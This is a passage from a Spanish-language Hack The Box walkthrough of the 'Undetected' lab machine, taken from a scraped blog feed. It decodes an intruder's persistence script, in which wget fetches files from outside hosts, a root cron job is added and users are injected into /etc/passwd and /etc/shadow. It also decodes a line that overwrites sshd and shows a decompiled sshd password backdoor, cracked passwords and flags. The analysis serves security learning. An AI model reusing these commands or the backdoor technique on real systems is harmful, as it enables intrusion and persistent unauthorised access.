776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b [-] fork() /etc/shadow [.] checking if we got root [-] something went wrong =( [+] got r00t ^_^ [-] unshare(CLONE_NEWUSER) deny /proc/self/setgroups [-] write_file(/proc/self/set_groups) 0 %d 1 /proc/self/uid_map [-] write_file(/proc/self/uid_map) /proc/self/gid_map [-] write_file(/proc/self/gid_map) [-] sched_setaffinity() /sbin/ifconfig lo up [-] system(/sbin/ifconfig lo up) [.] starting [.] namespace sandbox set up [.] KASLR bypass enabled, getting kernel addr [.] done, kernel text: %lx [.] commit_creds: %lx [.] prepare_kernel_cred: %lx [.] native_write_cr4: %lx [.] padding heap [.] done, heap is padded [.] SMEP \u0026amp; SMAP bypass enabled, turning them off [.] done, SMEP \u0026amp; SMAP should be off now [.] executing get root payload %p [.] done, should be root now ;*3$\u0026#34; GCC: (Debian 10.2.1-6) 10.2.1 20210110 crtstuff.c deregister_tm_clones [.. snip ..] .data .bss .comment π ~/htb/undetected ❯ Vemos que la string en hexadecimal descarga un archivo con claves publicas de acceso por SSH para el usuario root, crea un cronjob para ejecutar el archivo .main , agrega un hash de contraseña para el usuario con el uid mayor a 1000 en /etc/shadow bajo el nombre [usuario]1, finalmente modifica el archivo /etc/passwd para agregar nuevamente el [usuario]1. Con ello podriamos decir que el servidor fué \u0026ldquo;hackeado\u0026rdquo; y dejaron \u0026ldquo;persistencia\u0026rdquo; creando un usuario similar al existente en este caso steven1.\n1 2 3 4 5 6 7 wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \u0026#34;* 3 * * * root /var/lib/.main\u0026#34; \u0026gt;\u0026gt; /etc/crontab; awk -F \u0026#34;:\u0026#34; \u0026#39;$7 == \u0026#34;/bin/bash\u0026#34; \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\u0026#34;echo \u0026#34;$1\u0026#34;1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u0026gt;\u0026gt; /etc/shadow\u0026#34;)}\u0026#39; /etc/passwd; awk -F\u0026#34;:\u0026#34; \u0026#39;$7 == \u0026#34;/bin/bash\u0026#34; \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\u0026#34;echo \u0026#34;$1\u0026#34; \u0026#34;$3\u0026#34; \u0026#34;$6\u0026#34; \u0026#34;$7\u0026#34; \u0026gt; users.txt\u0026#34;)}\u0026#39; /etc/passwd; while read -r user group home shell _; do echo \u0026#34;$user\u0026#34;1\u0026#34;:x:$group:$group:,,,:$home:$shell\u0026#34; \u0026gt;\u0026gt; /etc/passwd; done \u0026lt; users.txt; rm users.txt; Hash Password Cracking Utilizamos john con el wordlist rockyou.txt, para obtener en texto plano el valor del hash.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/undetected ❯ john hash --wordlist=$ROCK Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ihatehackers (?) 1g 0:00:00:15 DONE (2022-02-20 01:18) 0.06281g/s 5595p/s 5595c/s 5595C/s littlebrat..halo03 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed π ~/htb/undetected ❯ Shell Utilizando la contraseña con el usuario steven1 logramos obtener una shell por SSH y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/undetected ❯ ssh steven1@djewelry.htb # ihatehackers steven1@djewelry.htb\u0026#39;s password: Last login: Thu Feb 24 00:33:00 2022 from 10.10.14.159 steven@production:~$ id uid=1000(steven) gid=1000(steven) groups=1000(steven) steven@production:~$ pwd /home/steven steven@production:~$ ls user.txt steven@production:~$ cat user.txt 3756735a2b22b0b6d56638bb7fb381ef steven@production:~$ Privesc En el archivo /etc/crontab vemos que aún existe el cronjob creado por el fichero info.\n1 2 3 4 5 6 7 8 9 10 11 steven@production:~$ cat /etc/crontab|grep -v \u0026#34;#\u0026#34; SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * 3 * * * root /var/lib/.main steven@production:~$ Aunque dicho archivo no existe en la maquina.\n1 2 3 steven@production:~$ ls -lah /var/lib/.main ls: cannot access \u0026#39;/var/lib/.main\u0026#39;: No such file or directory steven@production:~$ Enumerando los archivos de steven encontramos un mail.\n1 2 3 4 5 6 7 8 steven@production:~$ find / -user steven 2\u0026gt;/dev/null |grep -v proc /var/mail/steven /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service [.. snip ..] /home/steven/.ssh /home/steven/.bash_logout /home/steven/.bash_history [.. snip ..] Vemos que mencionan que el servicio de Apache tiene un comportamiento extraño y esta bajo investigación, mencionan que para tener acceso a la base de datos o el codigo fuente del sitio web es necesario contactar con Mark. Aunque este ultimo no existe en la maquina o algun servicio relacionado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 steven@production:~$ cat /var/mail/steven From root@production Sun, 25 Jul 2021 10:31:12 GMT Return-Path: \u0026lt;root@production\u0026gt; Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for \u0026lt;steven@production\u0026gt;; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: \u0026lt;202107251031.80FAcdZ171847@production\u0026gt; To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin steven@production:~$ Modulo Apache Tras enumerar archivos de apache encontramos que el modulo reader.load tiene una fecha distinta a la de los demás modulos. En dicho modulo se muestra la librería mod_reader.so, ambos archivos tienen la misma fecha de creación.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 steven@production:/etc/apache2/mods-enabled$ ls -lah total 8.0K drwxr-xr-x 2 root root 4.0K Feb 8 19:59 . drwxr-xr-x 8 root root 4.0K Feb 8 19:59 .. lrwxrwxrwx 1 root root 36 Jul 4 2021 access_compat.load -\u0026gt; ../mods-available/access_compat.load lrwxrwxrwx 1 root root 28 Jul 4 2021 alias.conf -\u0026gt; ../mods-available/alias.conf lrwxrwxrwx 1 root root 28 Jul 4 2021 alias.load -\u0026gt; ../mods-available/alias.load [.. snip ..] lrwxrwxrwx 1 root root 29 Jul 4 2021 php7.4.load -\u0026gt; ../mods-available/php7.4.load lrwxrwxrwx 1 root root 29 May 17 2021 reader.load -\u0026gt; ../mods-available/reader.load lrwxrwxrwx 1 root root 33 Jul 4 2021 reqtimeout.conf -\u0026gt; ../mods-available/reqtimeout.conf lrwxrwxrwx 1 root root 33 Jul 4 2021 reqtimeout.load -\u0026gt; ../mods-available/reqtimeout.load lrwxrwxrwx 1 root root 31 Jul 4 2021 setenvif.conf -\u0026gt; ../mods-available/setenvif.conf lrwxrwxrwx 1 root root 31 Jul 4 2021 setenvif.load -\u0026gt; ../mods-available/setenvif.load lrwxrwxrwx 1 root root 29 Jul 4 2021 status.conf -\u0026gt; ../mods-available/status.conf lrwxrwxrwx 1 root root 29 Jul 4 2021 status.load -\u0026gt; ../mods-available/status.load steven@production:/etc/apache2/mods-enabled$ cat ../mods-available/reader.load LoadModule reader_module /usr/lib/apache2/modules/mod_reader.so steven@production:/etc/apache2/mods-enabled$ ls -lah /usr/lib/apache2/modules/mod_reader.so -rw-r--r-- 1 root root 34K May 17 2021 /usr/lib/apache2/modules/mod_reader.so steven@production:/etc/apache2/mods-enabled$ Utilizamos netcat para obtener el archivo localmente. Ejecutamos strings sobre este archivo y vemos una string codificada en base64.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/undetected ❯ strings mod_reader.so __gmon_start__ _ITM_deregisterTMCloneTable [.. snip ..] \u0026lt;=tlH []A\\A] D$(1 D$(dH+ reader /bin/bash mod_reader.c d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk ;*3$\u0026#34; ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ 42PA GCC: (Debian 10.2.1-6) 10.2.1 20210110 [.. snip ..] .debug_aranges .debug_info .debug_abbrev .debug_line .debug_str .debug_loc .debug_ranges π ~/htb/undetected ❯ Observamos esta vez que el archivo sshd está siendo modificado, tomando la fecha del archivo a2enmod y dandole a sshd la misma.\n1 2 3 π ~/htb/undetected ❯ echo d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk|base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd π ~/htb/undetected Aunque ambos archivos deberían de tener la misma fecha no parece ser el caso.\n1 2 3 4 5 steven@production:~$ ls -lah /usr/sbin/sshd -rwxr-xr-x 1 root root 3.5M Apr 13 2020 /usr/sbin/sshd steven@production:~$ ls -lah /usr/sbin/a2enmod -rwxr-xr-x 1 root root 16K Sep 30 2020 /usr/sbin/a2enmod steven@production:~$ SSHD Backdoor Tanto el \u0026ldquo;exploit\u0026rdquo; (/var/backups/info) y la librería (mod_reader.so) parecieran ser algun tipo de persistencia dentro de la maquina, finalmente tenemos el archivo sshd que posiblemente sea un archivo modificado. Utilizamos netcat para obtener localmente este fichero, y utilizando Ghidra realizamos una analisis.\nDescubrimos en la función auth_password() una variable tipo char declarada, llamada backdoor que tiene como longitud 32 caracteres, observamos que realiza xor a este dentro de un while, finalmente compara la contraseña con el backdoor utilizando strcmp.\nauth_password()\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 /* WARNING: Could not reconcile some variable overlaps */ int auth_password(ssh *ssh,char *password) { Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; size_t sVar6; byte bVar7; int iVar8; long in_FS_OFFSET; char backdoor [31]; byte local_39 [9]; long local_30; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u0026gt;authctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u0026gt;pw; iVar8 = ctxt-\u0026gt;valid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *)backdoor; while( true ) { pbVar5 = pbVar4 + 1; *pbVar4 = bVar7 ^ 0x96; if (pbVar5 == local_39) break; bVar7 = *pbVar5; pbVar4 = pbVar5; } iVar2 = strcmp(password,backdoor); uVar3 = 1; if (iVar2 != 0) { sVar6 = strlen(password); uVar3 = 0; if (sVar6 \u0026lt; 0x401) { if ((ppVar1-\u0026gt;pw_uid == 0) \u0026amp;\u0026amp; (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != \u0026#39;\\0\u0026#39;) || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-\u0026gt;force_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh,password); if (ctxt-\u0026gt;force_pwchange != 0) { auth_restrict_session(ssh); } uVar3 = (uint)(iVar2 != 0 \u0026amp;\u0026amp; iVar8 != 0); } } } if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } GDB Ya que la función esta realizando una comparación de dos strings podríamos obtener el valorr de la variable backdoor. Utilizamos gdb para colocar un breackpoint en auth_password para obtener el valor cuando strcmp(password,backdoor).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 (gdb) disas auth_password Dump of assembler code for function auth_password: 0x0000555555564650 \u0026lt;+0\u0026gt;: endbr64 0x0000555555564654 \u0026lt;+4\u0026gt;: push %r14 0x0000555555564656 \u0026lt;+6\u0026gt;: mov %rsi,%r14 0x0000555555564659 \u0026lt;+9\u0026gt;: mov $0xffffa9f4,%esi 0x000055555556465e \u0026lt;+14\u0026gt;: mov $0xffffffd6,%edx 0x0000555555564663 \u0026lt;+19\u0026gt;: push %r13 0x0000555555564665 \u0026lt;+21\u0026gt;: push %r12 0x0000555555564667 \u0026lt;+23\u0026gt;: push %rbp 0x0000555555564668 \u0026lt;+24\u0026gt;: mov %rdi,%rbp 0x000055555556466b \u0026lt;+27\u0026gt;: push %rbx 0x000055555556466c \u0026lt;+28\u0026gt;: sub $0x30,%rsp 0x0000555555564670 \u0026lt;+32\u0026gt;: mov 0x860(%rdi),%rbx 0x0000555555564677 \u0026lt;+39\u0026gt;: movdqa 0x6d4b1(%rip),%xmm0 # 0x5555555d1b30 0x000055555556467f \u0026lt;+47\u0026gt;: mov %fs:0x28,%rax 0x0000555555564688 \u0026lt;+56\u0026gt;: mov %rax,0x28(%rsp) 0x000055555556468d \u0026lt;+61\u0026gt;: xor %eax,%eax 0x000055555556468f \u0026lt;+63\u0026gt;: mov %si,0x1c(%rsp) 0x0000555555564694 \u0026lt;+68\u0026gt;: mov %rsp,%rsi 0x0000555555564697 \u0026lt;+71\u0026gt;: lea 0x1f(%rsp),%rcx 0x000055555556469c \u0026lt;+76\u0026gt;: mov 0x30(%rbx),%r13 0x00005555555646a0 \u0026lt;+80\u0026gt;: mov 0xc(%rbx),%r12d 0x00005555555646a4 \u0026lt;+84\u0026gt;: movl $0xbcf0b5e3,0x18(%rsp) 0x00005555555646ac \u0026lt;+92\u0026gt;: movabs $0xb2d6f4a0fda0b3d6,%rax 0x00005555555646b6 \u0026lt;+102\u0026gt;: mov %rax,0x10(%rsp) 0x00005555555646bb \u0026lt;+107\u0026gt;: mov %rsi,%rax 0x00005555555646be \u0026lt;+110\u0026gt;: movb $0xa5,0x1e(%rsp) 0x00005555555646c3 \u0026lt;+115\u0026gt;: movaps %xmm0,(%rsp) 0x00005555555646c7 \u0026lt;+119\u0026gt;: jmp 0x5555555646d3 \u0026lt;auth_password+131\u0026gt; 0x00005555555646c9 \u0026lt;+121\u0026gt;: nopl 0x0(%rax) 0x00005555555646d0 \u0026lt;+128\u0026gt;: movzbl (%rax),%edx 0x00005555555646d3 \u0026lt;+131\u0026gt;: xor $0xffffff96,%edx 0x00005555555646d6 \u0026lt;+134\u0026gt;: add $0x1,%rax 0x00005555555646da \u0026lt;+138\u0026gt;: mov %dl,-0x1(%rax) 0x00005555555646dd \u0026lt;+141\u0026gt;: cmp %rcx,%rax 0x00005555555646e0 \u0026lt;+144\u0026gt;: jne 0x5555555646d0 \u0026lt;auth_password+128\u0026gt; 0x00005555555646e2 \u0026lt;+146\u0026gt;: mov %r14,%rdi 0x00005555555646e5 \u0026lt;+149\u0026gt;: callq 0x55555555f750 \u0026lt;strcmp@plt\u0026gt; \u0026lt;============================== 0x00005555555646ea \u0026lt;+154\u0026gt;: mov %eax,%r8d 0x00005555555646ed \u0026lt;+157\u0026gt;: mov $0x1,%eax 0x00005555555646f2 \u0026lt;+162\u0026gt;: test %r8d,%r8d 0x00005555555646f5 \u0026lt;+165\u0026gt;: je 0x55555556475f \u0026lt;auth_password+271\u0026gt; 0x00005555555646f7 \u0026lt;+167\u0026gt;: mov %r14,%rdi 0x00005555555646fa \u0026lt;+170\u0026gt;: callq 0x55555555efd0 \u0026lt;strlen@plt\u0026gt; 0x00005555555646ff \u0026lt;+175\u0026gt;: mov %rax,%r8 0x0000555555564702 \u0026lt;+178\u0026gt;: xor %eax,%eax 0x0000555555564704 \u0026lt;+180\u0026gt;: cmp $0x400,%r8 0x000055555556470b \u0026lt;+187\u0026gt;: ja 0x55555556475f \u0026lt;auth_password+271\u0026gt; 0x000055555556470d \u0026lt;+189\u0026gt;: mov 0x10(%r13),%ecx 0x0000555555564711 \u0026lt;+193\u0026gt;: test %ecx,%ecx 0x0000555555564713 \u0026lt;+195\u0026gt;: jne 0x555555564720 \u0026lt;auth_password+208\u0026gt; 0x0000555555564715 \u0026lt;+197\u0026gt;: cmpl $0x3,0xb4bf0(%rip) # 0x55555561930c \u0026lt;options+1132\u0026gt; 0x000055555556471c \u0026lt;+204\u0026gt;: cmovne %eax,%r12d 0x0000555555564720 \u0026lt;+208\u0026gt;: cmpb $0x0,(%r14) 0x0000555555564724 \u0026lt;+212\u0026gt;: jne 0x555555564730 \u0026lt;auth_password+224\u0026gt; 0x0000555555564726 \u0026lt;+214\u0026gt;: mov 0xb4cb0(%rip),%eax # 0x5555556193dc \u0026lt;options+1340\u0026gt; 0x000055555556472c \u0026lt;+220\u0026gt;: test %eax,%eax 0x000055555556472e \u0026lt;+222\u0026gt;: je 0x55555556475f \u0026lt;auth_password+271\u0026gt; 0x0000555555564730 \u0026lt;+224\u0026gt;: mov 0xb2dd2(%rip),%edx # 0x555555617508 \u0026lt;expire_checked.15270\u0026gt; 0x0000555555564736 \u0026lt;+230\u0026gt;: test %edx,%edx 0x0000555555564738 \u0026lt;+232\u0026gt;: je 0x55555556477c \u0026lt;auth_password+300\u0026gt; 0x000055555556473a \u0026lt;+234\u0026gt;: mov %r14,%rsi 0x000055555556473d \u0026lt;+237\u0026gt;: mov %rbp,%rdi 0x0000555555564740 \u0026lt;+240\u0026gt;: callq 0x5555555645b0 \u0026lt;sys_auth_passwd\u0026gt; 0x0000555555564745 \u0026lt;+245\u0026gt;: mov %eax,%r13d 0x0000555555564748 \u0026lt;+248\u0026gt;: mov 0x1c(%rbx),%eax 0x000055555556474b \u0026lt;+251\u0026gt;: test %eax,%eax 0x000055555556474d \u0026lt;+253\u0026gt;: jne 0x55555556479b \u0026lt;auth_password+331\u0026gt; 0x000055555556474f \u0026lt;+255\u0026gt;: test %r13d,%r13d 0x0000555555564752 \u0026lt;+258\u0026gt;: setne %dl 0x0000555555564755 \u0026lt;+261\u0026gt;: xor %eax,%eax 0x0000555555564757 \u0026lt;+263\u0026gt;: test %r12d,%r12d 0x000055555556475a \u0026lt;+266\u0026gt;: setne %al 0x000055555556475d \u0026lt;+269\u0026gt;: and %edx,%eax 0x000055555556475f \u0026lt;+271\u0026gt;: mov 0x28(%rsp),%rbx 0x0000555555564764 \u0026lt;+276\u0026gt;: xor %fs:0x28,%rbx 0x000055555556476d \u0026lt;+285\u0026gt;: jne 0x5555555647a5 \u0026lt;auth_password+341\u0026gt; 0x000055555556476f \u0026lt;+287\u0026gt;: add $0x30,%rsp 0x0000555555564773 \u0026lt;+291\u0026gt;: pop %rbx 0x0000555555564774 \u0026lt;+292\u0026gt;: pop %rbp 0x0000555555564775 \u0026lt;+293\u0026gt;: pop %r12 0x0000555555564777 \u0026lt;+295\u0026gt;: pop %r13 0x0000555555564779 \u0026lt;+297\u0026gt;: pop %r14 0x000055555556477b \u0026lt;+299\u0026gt;: retq 0x000055555556477c \u0026lt;+300\u0026gt;: movl $0x1,0xb2d82(%rip) # 0x555555617508 \u0026lt;expire_checked.15270\u0026gt; 0x0000555555564786 \u0026lt;+310\u0026gt;: mov %rbx,%rdi 0x0000555555564789 \u0026lt;+313\u0026gt;: callq 0x555555582360 \u0026lt;auth_shadow_pwexpired\u0026gt; 0x000055555556478e \u0026lt;+318\u0026gt;: test %eax,%eax 0x0000555555564790 \u0026lt;+320\u0026gt;: je 0x55555556473a \u0026lt;auth_password+234\u0026gt; 0x0000555555564792 \u0026lt;+322\u0026gt;: movl $0x1,0x1c(%rbx) 0x0000555555564799 \u0026lt;+329\u0026gt;: jmp 0x55555556473a \u0026lt;auth_password+234\u0026gt; 0x000055555556479b \u0026lt;+331\u0026gt;: mov %rbp,%rdi 0x000055555556479e \u0026lt;+334\u0026gt;: callq 0x55555556fc70 \u0026lt;auth_restrict_session\u0026gt; 0x00005555555647a3 \u0026lt;+339\u0026gt;: jmp 0x55555556474f \u0026lt;auth_password+255\u0026gt; 0x00005555555647a5 \u0026lt;+341\u0026gt;: callq 0x55555555f710 \u0026lt;__stack_chk_fail@plt\u0026gt; End of assembler dump. (gdb) Vemos el breakpoint definido, y ejecutamos el programa (sudo gdb -ex=r --args ./sshd -p 2222 -d).\n1 2 3 4 5 6 (gdb) b auth_password Breakpoint 1 at 0x555555564650: file auth-passwd.c, line 78. (gdb) info break Num Type Disp Enb Address What 1 breakpoint keep y 0x0000555555564650 in auth_password at auth-passwd.c:78 (gdb) r Ejecutamos el binario con las flags -d -p 2222, localmente nos autenticamos por SSH: ssh user@localhost -p 2222, vemos que el programa se detiene y muestra el breakpoint. Si vemos las variables locales, observamos backdoor .\n1 2 3 4 5 6 7 8 9 10 11 12 13 [.. snip ..] Breakpoint 1, auth_password (ssh=ssh@entry=0x555555639b00, password=0x55555562c240 \u0026#34;P@ssword123\u0026#34;) at auth-passwd.c:78 78 auth-passwd.c: No such file or directory. (gdb) info locals authctxt = \u0026lt;optimized out\u0026gt; pw = \u0026lt;optimized out\u0026gt; result = \u0026lt;optimized out\u0026gt; ok = \u0026lt;optimized out\u0026gt; expire_checked = 0 i = \u0026lt;optimized out\u0026gt; backdoor = \u0026#34;\\000\\000\\000\\000\\000\\000\\000\\000\\230\\060YUUU\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\b\\000\\000\\000\\000\\000\u0026#34; (gdb) Realizando varios \u0026ldquo;pasos\u0026rdquo; vemos que la variable backdoor va tomando valor.\n1 2 3 4 5 6 7 8 9 10 11 (gdb) step 5 87 in auth-passwd.c (gdb) info locals authctxt = 0x555555628f00 pw = 0x555555627780 result = \u0026lt;optimized out\u0026gt; ok = 1 expire_checked = 0 i = \u0026lt;optimized out\u0026gt; backdoor = \u0026#34;@=qfe5%2^k-aq@%k@%6k6b@$u#f\u0026#34;, \u0026lt;incomplete sequence \\364\\251\\245\u0026gt; (gdb) Finalmente después de varios \u0026ldquo;pasos\u0026rdquo; se completa, y el programa nos permite el acceso por SSH por el usuario dado.\n1 2 3 4 5 6 7 8 9 (gdb) info locals authctxt = 0x555555628f00 pw = 0x555555627780 result = \u0026lt;optimized out\u0026gt; ok = 1 expire_checked = 0 i = \u0026lt;optimized out\u0026gt; backdoor = \u0026#34;@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3\u0026#34; (gdb) El valor del backdoor parece ser una contraseña, pero no del usuario root, localmente.\n1 2 3 4 steven@production:~$ su root # @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 Password: su: Authentication failure steven@production:~$ Shell Aunque si realizamos la autenticación por fuera nos permite entrar como steven y como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/undetected ❯ ssh steven@djewelry.htb steven@djewelry.htb\u0026#39;s password: Last login: Thu Feb 24 00:46:15 2022 from 10.10.14.159 steven@production:~$ whoami;id steven uid=1000(steven) gid=1000(steven) groups=1000(steven) steven@production:~$ exit logout Connection to djewelry.htb closed. π ~/htb/undetected ❯ ssh root@djewelry.htb root@djewelry.htb\u0026#39;s password: Last login: Thu Feb 24 02:32:58 2022 from 10.10.14.159 root@production:~# Finalmente obtenemos nuestra flag root.txt.\n1 2 3 4 5 6 7 8 root@production:~# id; pwd uid=0(root) gid=0(root) groups=0(root) /root root@production:~# ls root.txt root@production:~# cat root.txt 103457be70d0083af8c991681b0f5fe9 root@production:~# ","description":"Tras descubrir una vulnerabilidad RCE en PHPUnit logramos obtener acceso a al máquina. Distintos archivos que indicaban una \"intrución\" y \"persistencia\" en la máquina nos llevaron a un segundo usuario. Finalmente tras analizar distintos ficheros de Apache obtuvimos acceso privilegiado.","id":23,"section":"posts","tags":["php","phpunit","rce","gdb","ghidra","CVE-2017-9841"],"title":"Hack The Box - Undetected","uri":"https://sckull.github.io/posts/undetected/"},{"content":"\rEn Paper descubrimos una vulnerabilidad que permite leer los posts archivados/privados lo que nos permitió acceder a un link de registro de Rocket.chat, en este ultimo logramos listar y observar el contenido de archivos de la máquina con la ayuda de comandos de un Bot, lo que nos dio acceso por SSH. Finalmente escalamos privilegios explotando la vulnerabilidad de Polkit.\nNombre Paper OS Linux Puntos 20 Dificultad Facil IP 10.10.11.143 Maker secnigma\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.6, 4.5, 5.7, 4.3, 5.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[9, 7, 10, 0, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap nos muestra abiertos los puertos: http/s (80, 443) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # Nmap 7.91 scan initiated Sat Feb 5 23:19:51 2022 as: nmap -p22,80,443 -sC -sV -oN nmap_scan 10.129.104.126 Nmap scan report for 10.129.104.126 (10.129.104.126) Host is up (0.088s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 